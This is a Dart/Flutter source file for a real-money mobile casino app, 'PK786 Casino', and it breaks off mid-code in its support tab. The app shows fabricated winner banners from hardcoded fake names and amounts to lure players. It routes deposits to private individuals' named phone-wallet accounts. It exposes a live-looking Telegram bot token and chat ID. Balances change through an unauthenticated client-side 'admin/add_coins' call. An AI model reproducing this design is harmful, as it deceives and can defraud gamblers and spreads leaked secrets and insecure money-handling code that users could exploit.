import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:image_picker/image_picker.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ==========================================================
// PYTHONANYWHERE PERMANENT SERVER & TELEGRAM CONFIGURATION
// ==========================================================
const String serverUrl = 'https://Alibaba786.pythonanywhere.com';
const String telegramBotToken = '8484105200:AAE4z7_EOf_RwE9xUAu7EPSChNXiy4PMcZE';
const String telegramChatId = '8052842442';

const String bgImageUrl = 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/raw/IMG-20261030-WA2592.jpg';

const Color kGold = Color(0xFFFFD700);
const Color kSurface = Color(0xFF161622);
const Color kBg = Color(0xFF0A0A0E);
const List<Color> kWheelColors = [
  Colors.red, Colors.blue, Colors.green, Colors.orange, Colors.purple, Colors.teal,
];

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const PK786App());
}

class PK786App extends StatelessWidget {
  const PK786App({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'PK786 Casino',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: kBg,
        primaryColor: kGold,
        colorScheme: const ColorScheme.dark(
          primary: kGold,
          secondary: Color(0xFFFF2A6D),
          surface: kSurface,
        ),
      ),
      home: const SplashScreen(),
    );
  }
}

// ==========================================================
// PUBG STYLE TOP OVERLAY NOTIFICATION HELPER (3 SECONDS)
// ==========================================================
void showPubgBanner(BuildContext context, String message, {bool isWin = false}) {
  OverlayEntry? overlayEntry;
  overlayEntry = OverlayEntry(
    builder: (context) => Positioned(
      top: MediaQuery.of(context).padding.top + 10,
      left: 20,
      right: 20,
      child: Material(
        color: Colors.transparent,
        child: TweenAnimationBuilder<double>(
          tween: Tween(begin: 0.0, end: 1.0),
          duration: const Duration(milliseconds: 300),
          builder: (context, value, child) {
            return Transform.scale(
              scale: value,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                decoration: BoxDecoration(
                  color: isWin ? Colors.green.shade800 : Colors.black87,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: isWin ? Colors.greenAccent : kGold, width: 2),
                  boxShadow: const [BoxShadow(color: Colors.black54, blurRadius: 10, offset: Offset(0, 4))],
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(isWin ? Icons.celebration : Icons.notifications_active, color: kGold),
                    const SizedBox(width: 10),
                    Expanded(
                      child: Text(
                        message,
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14),
                      ),
                    ),
                  ],
                ),
              ),
            );
          },
        ),
      ),
    ),
  );

  Overlay.of(context).insert(overlayEntry);
  Future.delayed(const Duration(seconds: 3), () {
    overlayEntry?.remove();
  });
}

// ==========================================================
// PRO PROMINENT RANDOM WINNER BANNER (EVERY 60 SECONDS)
// ==========================================================
void showRandomWinnerBanner(BuildContext context) {
  final List<String> fakeNames = ['If***n', 'Al***n', 'Ra***h', 'Fa***n', 'Mo***d', 'Ka***r'];
  final List<String> fakeAmounts = ['50***0', '80***0', '90***0', '12***0', '30***0'];
  String randomName = fakeNames[Random().nextInt(fakeNames.length)];
  String randomAmt = fakeAmounts[Random().nextInt(fakeAmounts.length)];

  OverlayEntry? entry;
  entry = OverlayEntry(
    builder: (context) => Positioned(
      bottom: 100,
      left: 20,
      right: 20,
      child: Material(
        color: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
          decoration: BoxDecoration(
            color: const Color(0xFF161622).withOpacity(0.95),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: kGold, width: 2),
            boxShadow: const [BoxShadow(color: Colors.black, blurRadius: 15, offset: Offset(0, 5))],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.emoji_events, color: kGold, size: 28),
              const SizedBox(width: 12),
              Text(
                '🤵 $randomName Wins $randomAmt PKR',
                style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 1),
              ),
            ],
          ),
        ),
      ),
    ),
  );

  Overlay.of(context).insert(entry);
  Future.delayed(const Duration(seconds: 3), () {
    entry?.remove();
  });
}

// ==========================================================
// SAFE SPLASH SCREEN
// ==========================================================
class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    _checkSession();
  }

  void _checkSession() async {
    try {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      bool isLoggedIn = prefs.getBool('isLoggedIn') ?? false;
      String username = prefs.getString('username') ?? '';
      String phone = prefs.getString('phone') ?? '';

      if (!mounted) return;
      if (isLoggedIn && username.isNotEmpty) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => MainDashboard(username: username, phone: phone)),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => const LoginScreen()),
        );
      }
    } catch (e) {
      if (!mounted) return;
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const LoginScreen()),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.2), BlendMode.darken)),
        ),
        child: const Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.casino, size: 90, color: kGold),
              SizedBox(height: 16),
              Text(
                'PK786 CASINO',
                style: TextStyle(fontSize: 28, fontWeight: FontWeight.w900, color: kGold, letterSpacing: 3),
              ),
              SizedBox(height: 30),
              CircularProgressIndicator(color: kGold),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================================
// 1. LOGIN & OLD ID RECOVERY SCREEN
// ==========================================================
class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _usernameController = TextEditingController();
  final _phoneController = TextEditingController();
  final _jazzcashController = TextEditingController();
  final _upaisaController = TextEditingController();
  final _easypaisaController = TextEditingController();
  bool isLoggingIn = false;

  void _handleRegisterOrLogin({bool isOldLogin = false}) async {
    String username = _usernameController.text.trim().replaceAll('@', '');
    String phone = _phoneController.text.trim();

    if (username.isEmpty) {
      showPubgBanner(context, 'Username is required!');
      return;
    }

    if (!isOldLogin && phone.isEmpty) {
      showPubgBanner(context, 'Phone Number is required for new registration!');
      return;
    }

    if (!isOldLogin && _jazzcashController.text.trim().isEmpty && _upaisaController.text.trim().isEmpty && _easypaisaController.text.trim().isEmpty) {
      showPubgBanner(context, 'Provide at least one Payment Method!');
      return;
    }

    setState(() => isLoggingIn = true);

    try {
      final endpoint = isOldLogin ? '$serverUrl/api/login' : '$serverUrl/api/register';
      final response = await http.post(
        Uri.parse(endpoint),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'username': username,
          'phone': phone,
          'jazzcash': _jazzcashController.text.trim(),
          'upaisa': _upaisaController.text.trim(),
          'easypaisa': _easypaisaController.text.trim(),
        }),
      );

      setState(() => isLoggingIn = false);

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['status'] == 'success') {
          SharedPreferences prefs = await SharedPreferences.getInstance();
          await prefs.setBool('isLoggedIn', true);
          await prefs.setString('username', username);
          await prefs.setString('phone', phone);

          if (!mounted) return;
          showPubgBanner(context, 'Welcome back, @$username!', isWin: true);
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (context) => MainDashboard(username: username, phone: phone)),
          );
        } else {
          showPubgBanner(context, data['message'] ?? 'User not found! Check username and phone.');
        }
      } else {
        showPubgBanner(context, 'Server connection failed.');
      }
    } catch (e) {
      setState(() => isLoggingIn = false);
      showPubgBanner(context, 'Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.casino, size: 80, color: kGold),
                const SizedBox(height: 12),
                const Text(
                  'PK786',
                  style: TextStyle(fontSize: 38, fontWeight: FontWeight.w900, color: kGold, letterSpacing: 4),
                ),
                const Text('REAL CASINO EXPERIENCE', style: TextStyle(color: Colors.grey, fontSize: 12, letterSpacing: 2)),
                const SizedBox(height: 35),
                TextField(
                  controller: _usernameController,
                  decoration: InputDecoration(
                    labelText: 'Unique Username',
                    prefixIcon: const Icon(Icons.person, color: kGold),
                    filled: true,
                    fillColor: kSurface,
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: _phoneController,
                  keyboardType: TextInputType.phone,
                  decoration: InputDecoration(
                    labelText: 'Phone Number',
                    prefixIcon: const Icon(Icons.phone, color: kGold),
                    filled: true,
                    fillColor: kSurface,
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: _jazzcashController,
                  keyboardType: TextInputType.phone,
                  decoration: InputDecoration(
                    labelText: 'JazzCash Number',
                    prefixIcon: const Icon(Icons.account_balance_wallet, color: Colors.orangeAccent),
                    filled: true,
                    fillColor: kSurface,
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: _upaisaController,
                  keyboardType: TextInputType.phone,
                  decoration: InputDecoration(
                    labelText: 'Upaisa Number',
                    prefixIcon: const Icon(Icons.account_balance_wallet, color: Colors.greenAccent),
                    filled: true,
                    fillColor: kSurface,
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: _easypaisaController,
                  keyboardType: TextInputType.phone,
                  decoration: InputDecoration(
                    labelText: 'Easypaisa Number',
                    prefixIcon: const Icon(Icons.account_balance_wallet, color: Colors.blueAccent),
                    filled: true,
                    fillColor: kSurface,
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 30),
                SizedBox(
                  width: double.infinity,
                  height: 50,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: kGold,
                      foregroundColor: Colors.black,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    ),
                    onPressed: isLoggingIn ? null : () => _handleRegisterOrLogin(isOldLogin: false),
                    child: isLoggingIn
                        ? const CircularProgressIndicator(color: Colors.black)
                        : const Text('CREATE NEW ACCOUNT', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                  ),
                ),
                const SizedBox(height: 12),
                TextButton(
                  onPressed: isLoggingIn ? null : () => _handleRegisterOrLogin(isOldLogin: true),
                  child: const Text('Already have an ID? Login & Recover Coins', style: TextStyle(color: kGold, fontWeight: FontWeight.bold)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==========================================================
// 2. MAIN DASHBOARD WITH SERVER POLLING & WINNER TIMER
// ==========================================================
class MainDashboard extends StatefulWidget {
  final String username;
  final String phone;

  const MainDashboard({super.key, required this.username, required this.phone});

  @override
  State<MainDashboard> createState() => _MainDashboardState();
}

class _MainDashboardState extends State<MainDashboard> {
  int _currentIndex = 0;
  double userCoins = 0.0;
  Timer? _serverPollTimer;
  Timer? _winnerBannerTimer;

  @override
  void initState() {
    super.initState();
    _fetchServerBalance();
    _startServerSync();
    _startWinnerBannerTimer();
  }

  void _fetchServerBalance() async {
    try {
      final response = await http.get(Uri.parse('$serverUrl/api/balance/${widget.username}'));
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (mounted) {
          setState(() {
            userCoins = double.parse(data['coins'].toString());
          });
        }
      }
    } catch (e) {}
  }

  void _updateCoinsOnServer(double netChange) async {
    if (netChange < 0) {
      double deduction = netChange.abs();
      if (userCoins >= deduction) {
        userCoins -= deduction;
      } else {
        userCoins = 0.0;
      }
    } else {
      userCoins += netChange;
    }
    setState(() {});

    try {
      await http.post(
        Uri.parse('$serverUrl/api/admin/add_coins'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({'username': widget.username, 'amount': netChange}),
      );
      _fetchServerBalance();
    } catch (e) {}
  }

  void _setBalanceDirectly(double newBalance) {
    setState(() {
      userCoins = newBalance;
    });
    _fetchServerBalance();
  }

  void _startServerSync() {
    _serverPollTimer = Timer.periodic(const Duration(seconds: 4), (timer) {
      _fetchServerBalance();
    });
  }

  void _startWinnerBannerTimer() {
    _winnerBannerTimer = Timer.periodic(const Duration(seconds: 60), (timer) {
      if (mounted) {
        showRandomWinnerBanner(context);
      }
    });
  }

  @override
  void dispose() {
    _serverPollTimer?.cancel();
    _winnerBannerTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final List<Widget> pages = [
      GamesHomeTab(username: widget.username, coins: userCoins, onUpdate: _updateCoinsOnServer),
      BuyCoinsTab(username: widget.username, phone: widget.phone),
      WithdrawTab(username: widget.username, coins: userCoins, onBalanceUpdated: _setBalanceDirectly),
      MessageOwnerTab(username: widget.username, phone: widget.phone),
      ProfileTab(username: widget.username, phone: widget.phone, coins: userCoins),
    ];

    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.35), BlendMode.darken)),
        ),
        child: pages[_currentIndex],
      ),
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _currentIndex,
        selectedItemColor: kGold,
        unselectedItemColor: Colors.grey,
        backgroundColor: const Color(0xFF101018),
        type: BottomNavigationBarType.fixed,
        onTap: (index) => setState(() => _currentIndex = index),
        items: const [
          BottomNavigationBarItem(icon: Icon(Icons.sports_esports), label: 'Games'),
          BottomNavigationBarItem(icon: Icon(Icons.add_shopping_cart), label: 'Buy Coins'),
          BottomNavigationBarItem(icon: Icon(Icons.account_balance_wallet), label: 'Withdraw'),
          BottomNavigationBarItem(icon: Icon(Icons.support_agent), label: 'Support'),
          BottomNavigationBarItem(icon: Icon(Icons.account_circle), label: 'Account'),
        ],
      ),
    );
  }
}

// ==========================================================
// TAB 1: GAMES HOME TAB (7 GAMES WITH EXACT IMAGES)
// ==========================================================
class GamesHomeTab extends StatelessWidget {
  final String username;
  final double coins;
  final Function(double) onUpdate;

  const GamesHomeTab({super.key, required this.username, required this.coins, required this.onUpdate});

  @override
  Widget build(BuildContext context) {
    final games = [
      {
        'name': 'Aviator',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA8205.jpg',
        'widget': AviatorGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'Casino Slots',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/Screenshot_20261030_115850_Google.jpg',
        'widget': SlotsGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'Lucky Spin Wheel',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA7462.jpg',
        'widget': SpinGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'High Low Dice',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA9934.jpg',
        'widget': DiceGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'Minesweeper',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA3036.jpg',
        'widget': MinesGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'Limbo Rocket',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA8013.jpg',
        'widget': LimboGame(coins: coins, onUpdate: onUpdate)
      },
      {
        'name': 'Plinko',
        'img': 'https://raw.githubusercontent.com/827vzizb/Bsksnwbs/refs/heads/main/IMG-20261030-WA7461.jpg',
        'widget': PlinkoGame(coins: coins, onUpdate: onUpdate)
      },
    ];

    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(
        title: Text('PK786 CASINO - @$username', style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
        backgroundColor: const Color(0xFF101018),
        actions: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
            margin: const EdgeInsets.only(right: 16),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A2A),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: kGold),
            ),
            child: Row(
              children: [
                const Icon(Icons.monetization_on, color: kGold, size: 18),
                const SizedBox(width: 6),
                Text('${coins.toStringAsFixed(0)} Coins', style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.white)),
              ],
            ),
          )
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(12.0),
        child: GridView.builder(
          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            crossAxisCount: 2,
            crossAxisSpacing: 12,
            mainAxisSpacing: 12,
            childAspectRatio: 0.85,
          ),
          itemCount: games.length,
          itemBuilder: (context, index) {
            final game = games[index];
            return GestureDetector(
              onTap: () {
                Navigator.push(
                  context,
                  MaterialPageRoute(builder: (context) => game['widget'] as Widget),
                );
              },
              child: Container(
                decoration: BoxDecoration(
                  color: kSurface,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: kGold.withOpacity(0.7)),
                  boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 8)],
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Expanded(
                      flex: 7,
                      child: ClipRRect(
                        borderRadius: const BorderRadius.vertical(top: Radius.circular(16)),
                        child: Image.network(game['img'] as String, fit: BoxFit.cover, errorBuilder: (c, e, s) => const Center(child: Icon(Icons.casino, size: 50))),
                      ),
                    ),
                    Expanded(
                      flex: 3,
                      child: Padding(
                        padding: const EdgeInsets.all(6.0),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text(game['name'] as String, style: const TextStyle(fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white), textAlign: TextAlign.center),
                            const SizedBox(height: 2),
                            const Text('BET 100 - 30K', style: TextStyle(fontSize: 10, color: kGold, fontWeight: FontWeight.bold)),
                          ],
                        ),
                      ),
                    )
                  ],
                ),
              ),
            );
          },
        ),
      ),
    );
  }
}

// ==========================================================
// TAB 2: BUY COINS (OWNER ACCOUNTS & TELEGRAM)
// ==========================================================
class BuyCoinsTab extends StatefulWidget {
  final String username;
  final String phone;

  const BuyCoinsTab({super.key, required this.username, required this.phone});

  @override
  State<BuyCoinsTab> createState() => _BuyCoinsTabState();
}

class _BuyCoinsTabState extends State<BuyCoinsTab> {
  final _trxController = TextEditingController();
  final _amountController = TextEditingController();
  String selectedMethod = 'JazzCash';
  File? _selectedImage;
  bool isUploading = false;

  Future<void> _pickImage() async {
    final picker = ImagePicker();
    final pickedFile = await picker.pickImage(source: ImageSource.gallery);
    if (pickedFile != null) {
      setState(() {
        _selectedImage = File(pickedFile.path);
      });
    }
  }

  void _submitDeposit() async {
    if (_trxController.text.isEmpty || _amountController.text.isEmpty) {
      showPubgBanner(context, 'Fill all fields!');
      return;
    }

    setState(() => isUploading = true);

    try {
      final response = await http.post(
        Uri.parse('$serverUrl/api/deposit'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'username': widget.username,
          'amount': _amountController.text,
          'method': selectedMethod,
          'trx': _trxController.text,
        }),
      );

      if (_selectedImage != null && telegramBotToken != 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
        var request = http.MultipartRequest(
          'POST',
          Uri.parse('https://api.telegram.org/bot$telegramBotToken/sendPhoto'),
        );
        request.fields['chat_id'] = telegramChatId;
        request.fields['caption'] = '💰 New Deposit Proof!\n👤 User: @${widget.username}\n💵 Amount: ${_amountController.text} PKR\n📱 Method: $selectedMethod\n🔖 TrxID: ${_trxController.text}';
        request.files.add(await http.MultipartFile.fromPath('photo', _selectedImage!.path));
        await request.send();
      }

      setState(() => isUploading = false);

      if (!mounted) return;

      if (response.statusCode == 200) {
        _trxController.clear();
        _amountController.clear();
        setState(() => _selectedImage = null);
        showPubgBanner(context, 'Deposit proof submitted successfully!', isWin: true);
      } else {
        showPubgBanner(context, 'Failed to submit deposit.');
      }
    } catch (e) {
      setState(() => isUploading = false);
      showPubgBanner(context, 'Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(title: const Text('Buy Coins (1 PKR = 1 Coin)'), backgroundColor: const Color(0xFF101018)),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: kSurface,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: kGold),
              ),
              child: const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('Official Accounts (Send Payment Here):', style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold, color: kGold)),
                  SizedBox(height: 8),
                  Text('• JazzCash: 03254135792 (Faizan Maqbool)', style: TextStyle(fontSize: 14, color: Colors.white)),
                  SizedBox(height: 4),
                  Text('• Upaisa: 03054926639 (Parveen Kausar)', style: TextStyle(fontSize: 14, color: Colors.white)),
                  SizedBox(height: 4),
                  Text('• Easypaisa: 03431044275 (Muhammad Awais)', style: TextStyle(fontSize: 14, color: Colors.white)),
                  SizedBox(height: 10),
                  Text('⚠️ Payment Screenshot Proof Send Necessary!', style: TextStyle(color: Colors.redAccent, fontWeight: FontWeight.bold, fontSize: 13)),
                ],
              ),
            ),
            const SizedBox(height: 20),
            Row(
              children: [
                Expanded(
                  child: ChoiceChip(
                    label: const Text('JazzCash'),
                    selected: selectedMethod == 'JazzCash',
                    selectedColor: Colors.orange,
                    onSelected: (val) => setState(() => selectedMethod = 'JazzCash'),
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: ChoiceChip(
                    label: const Text('Upaisa'),
                    selected: selectedMethod == 'Upaisa',
                    selectedColor: Colors.green,
                    onSelected: (val) => setState(() => selectedMethod = 'Upaisa'),
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: ChoiceChip(
                    label: const Text('Easypaisa'),
                    selected: selectedMethod == 'Easypaisa',
                    selectedColor: Colors.blue,
                    onSelected: (val) => setState(() => selectedMethod = 'Easypaisa'),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            TextField(
              controller: _amountController,
              keyboardType: TextInputType.number,
              decoration: InputDecoration(labelText: 'Amount (PKR)', filled: true, fillColor: kSurface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12))),
            ),
            const SizedBox(height: 16),
            TextField(
              controller: _trxController,
              decoration: InputDecoration(labelText: 'TrxID', filled: true, fillColor: kSurface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12))),
            ),
            const SizedBox(height: 16),
            ElevatedButton.icon(
              style: ElevatedButton.styleFrom(backgroundColor: kSurface, foregroundColor: kGold),
              onPressed: _pickImage,
              icon: const Icon(Icons.image),
              label: Text(_selectedImage == null ? 'Select Payment Screenshot' : 'Screenshot Attached ✅'),
            ),
            const SizedBox(height: 24),
            SizedBox(
              width: double.infinity,
              height: 50,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: kGold, foregroundColor: Colors.black),
                onPressed: isUploading ? null : _submitDeposit,
                child: Text(isUploading ? 'UPLOADING...' : 'SUBMIT DEPOSIT PROOF', style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// TAB 3: COINS TO MONEY WITHDRAWAL SESSION (EXACT BALANCE SYNC)
// ==========================================================
class WithdrawTab extends StatefulWidget {
  final String username;
  final double coins;
  final Function(double) onBalanceUpdated;

  const WithdrawTab({super.key, required this.username, required this.coins, required this.onBalanceUpdated});

  @override
  State<WithdrawTab> createState() => _WithdrawTabState();
}

class _WithdrawTabState extends State<WithdrawTab> {
  final _amountController = TextEditingController();
  final _accController = TextEditingController();
  String selectedMethod = 'JazzCash';
  bool isSubmitting = false;

  void _submitWithdrawal() async {
    String amtStr = _amountController.text.trim();
    String acc = _accController.text.trim();

    if (amtStr.isEmpty || acc.isEmpty) {
      showPubgBanner(context, 'Enter amount and account number!');
      return;
    }

    double reqCoins = double.tryParse(amtStr) ?? 0;
    if (reqCoins <= 0) {
      showPubgBanner(context, 'Invalid withdrawal amount!');
      return;
    }

    if (reqCoins > widget.coins) {
      showPubgBanner(context, 'You have not this much coins!');
      return;
    }

    setState(() => isSubmitting = true);

    try {
      final response = await http.post(
        Uri.parse('$serverUrl/api/withdraw'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'username': widget.username,
          'amount': reqCoins,
          'method': selectedMethod,
          'account': acc,
        }),
      );

      setState(() => isSubmitting = false);

      if (!mounted) return;

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['status'] == 'success') {
          double remainingCoins = double.parse(data['coins'].toString());
          widget.onBalanceUpdated(remainingCoins);
          _amountController.clear();
          _accController.clear();
          showPubgBanner(context, 'Your withdrawn amount will come in your account under few hours!', isWin: true);
        } else {
          showPubgBanner(context, data['message'] ?? 'Withdrawal failed.');
        }
      } else {
        showPubgBanner(context, 'Server error during withdrawal.');
      }
    } catch (e) {
      setState(() => isSubmitting = false);
      showPubgBanner(context, 'Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(title: const Text('Coins to Money Withdrawal'), backgroundColor: const Color(0xFF101018)),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Available Balance: ${widget.coins.toStringAsFixed(0)} Coins', style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: kGold)),
            const SizedBox(height: 20),
            Row(
              children: [
                Expanded(
                  child: ChoiceChip(
                    label: const Text('JazzCash'),
                    selected: selectedMethod == 'JazzCash',
                    selectedColor: Colors.orange,
                    onSelected: (val) => setState(() => selectedMethod = 'JazzCash'),
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: ChoiceChip(
                    label: const Text('Upaisa'),
                    selected: selectedMethod == 'Upaisa',
                    selectedColor: Colors.green,
                    onSelected: (val) => setState(() => selectedMethod = 'Upaisa'),
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: ChoiceChip(
                    label: const Text('Easypaisa'),
                    selected: selectedMethod == 'Easypaisa',
                    selectedColor: Colors.blue,
                    onSelected: (val) => setState(() => selectedMethod = 'Easypaisa'),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            TextField(
              controller: _amountController,
              keyboardType: TextInputType.number,
              decoration: InputDecoration(labelText: 'Coins to Withdraw', filled: true, fillColor: kSurface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12))),
            ),
            const SizedBox(height: 16),
            TextField(
              controller: _accController,
              keyboardType: TextInputType.phone,
              decoration: InputDecoration(labelText: 'Account Number ($selectedMethod)', filled: true, fillColor: kSurface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12))),
            ),
            const SizedBox(height: 24),
            SizedBox(
              width: double.infinity,
              height: 50,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: kGold, foregroundColor: Colors.black),
                onPressed: isSubmitting ? null : _submitWithdrawal,
                child: Text(isSubmitting ? 'PROCESSING...' : 'WITHDRAW COINS', style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// TAB 4: MESSAGE OWNER
// ==========================================================
class MessageOwnerTab extends StatefulWidget {
  final String username;
  final String phone;

  const MessageOwnerTab({super.key, required this.username, required this.phone});

  @override
  State<MessageOwnerTab> createState() => _MessageOwnerTabState();
}

class _MessageOwnerTabState extends State<MessageOwnerTab> {
  final _msgController = TextEditingController();
  bool isSending = false;

  void _sendMessageToOwner() async {
    String text = _msgController.text.trim();
    if (text.isEmpty) {
      showPubgBanner(context, 'Please write a message!');
      return;
    }

    setState(() => isSending = true);

    try {
      final response = await http.post(
        Uri.parse('$serverUrl/api/deposit'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'username': widget.username,
          'amount': '0',
          'method': 'Support Msg',
          'trx': text,
        }),
      );

      setState(() => isSending = false);

      if (!mounted) return;

      if (response.statusCode == 200) {
        _msgController.clear();
        showPubgBanner(context, 'Message sent successfully!', isWin: true);
      } else {
        showPubgBanner(context, 'Failed to send message.');
      }
    } catch (e) {
      setState(() => isSending = false);
      showPubgBanner(context, 'Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(title: const Text('Support & Message Owner'), backgroundColor: const Color(0xFF101018)),
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
